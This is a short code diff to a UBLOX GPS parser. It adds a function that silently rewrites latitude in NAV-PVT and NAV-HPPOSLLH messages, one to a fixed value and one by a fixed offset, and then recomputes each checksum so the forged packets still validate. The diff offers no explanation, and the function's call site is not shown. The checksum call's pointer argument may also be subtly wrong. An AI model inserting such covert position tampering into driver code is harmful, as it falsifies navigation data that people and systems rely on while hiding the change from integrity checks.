@@ -539,7 +539,8 @@ bool UBLOX::_parseAutoCK()
 
 			// compute checksum
 			if ((_parserState - sizeof(_ubxPreamble)) == (sizeof(_Header) + ((_Header*)_tempPacket)->msg_length)) {
-				memcpy(_checksum, _tempChecksum, sizeof(_checksum));
+				_checksum[0] = _tempChecksum[0];
+				_checksum[1] = _tempChecksum[1];
 			} else if ((_parserState - sizeof(_ubxPreamble)) == (sizeof(_Header) + ((_Header*)_tempPacket)->msg_length + 1)) {
 				if (_byte != _checksum[0]) {
 					_resetParserAndTmpCK();
@@ -556,6 +557,20 @@ bool UBLOX::_parseAutoCK()
 		}
 	}
 	return false;
+}
+
+void UBLOX::_modifyPVT()
+{
+	if(((_Header*)_tempPacket)->msg_class == 0x01 && ((_Header*)_tempPacket)->msg_id == 0x07)
+	{
+		((_UBX_NAV_PVT*)_tempPacket)->lat = 10000000;
+		_calcChecksum(_checksum, ((uint8_t *) &_tempPacket), sizeof(_Header) + ((_Header*)_tempPacket)->msg_length);
+	}
+	if(((_Header*)_tempPacket)->msg_class == 0x01 && ((_Header*)_tempPacket)->msg_id == 0x14)
+	{
+		((_UBX_NAV_HPPOSLLH*)_tempPacket)->lat += 10000000;
+		_calcChecksum(_checksum, ((uint8_t *) &_tempPacket), sizeof(_Header) + ((_Header*)_tempPacket)->msg_length);
+	}
 }
 
 void UBLOX::_resetParserAndTmpCK() 
